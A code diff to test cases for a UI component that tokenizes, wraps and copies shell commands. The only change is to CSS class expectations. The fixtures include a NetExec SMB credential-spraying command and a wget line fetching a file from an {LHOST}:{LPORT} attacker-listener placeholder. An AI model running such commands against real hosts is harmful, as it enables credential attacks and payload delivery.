@@ -61,7 +61,7 @@ describe("CommandBlock wrapping", () => {
     const { container } = render(<CommandBlock text={cmd} />);
     const tokens = [...container.querySelectorAll("[data-token]")];
     expect(tokens.map((t) => t.textContent)).toEqual(["nxc", "smb", "-u", "'backup-operator'", "--continue-on-success"]);
-    for (const t of tokens) expect(t).toHaveClass("whitespace-nowrap");
+    for (const t of tokens) expect(t).toHaveClass("inline-block", "max-w-full", "[overflow-wrap:anywhere]");
     expect(container.querySelector("code")!.textContent).toBe(cmd);
     await userEvent.setup().click(screen.getByRole("button", { name: "Copy" }));
     expect(await navigator.clipboard.readText()).toBe(cmd);
@@ -127,7 +127,7 @@ describe("CommandBlock placeholders inside a token", () => {
     const { container } = render(<CommandBlock text="wget http://{LHOST}:{LPORT}/x -O out" placeholders />);
     const tokens = [...container.querySelectorAll("[data-token]")];
     expect(tokens.map((t) => t.textContent)).toEqual(["wget", "http://{LHOST}:{LPORT}/x", "-O", "out"]);
-    expect(tokens[1]).toHaveClass("whitespace-nowrap");
+    expect(tokens[1]).toHaveClass("inline-block", "[overflow-wrap:anywhere]");
     const marked = [...tokens[1].querySelectorAll("mark")].map((m) => m.textContent);
     expect(marked).toEqual(["{LHOST}", "{LPORT}"]);
     expect(container.querySelector("code")!.textContent).toBe("wget http://{LHOST}:{LPORT}/x -O out");
